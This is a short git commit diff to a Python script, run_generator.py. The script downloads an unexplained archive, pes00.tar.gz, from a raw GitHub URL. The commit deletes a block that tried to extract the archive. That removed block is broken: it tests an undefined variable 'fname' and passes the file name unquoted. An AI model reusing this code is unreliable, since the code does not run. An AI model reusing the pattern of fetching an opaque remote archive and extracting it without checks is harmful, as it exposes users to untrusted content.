72d9193c9e90d693f194042517d2c5c48d4b31fd
jazzup6176 <88086548+jazzup6176@users.noreply.github.com>
2021-10-23 19:36:53 +0200

    Update run_generator.py

--- run_generator.py
+++ run_generator.py
@@ -2,13 +2,3 @@ import wget
 site_url = 'https://raw.githubusercontent.com/jazzup6176/new/main/pes00.tar.gz'
 file_name = wget.download(site_url)
 print(file_name)
-
-import tarfile
-if fname.endswith("tar.gz"):
-    tar = tarfile.open(pes00.tar.gz, "r:gz")
-    tar.extractall()
-    tar.close()
-elif fname.endswith("tar"):
-    tar = tarfile.open(pes00.tar.gz, "r:")
-    tar.extractall()
-    tar.close()
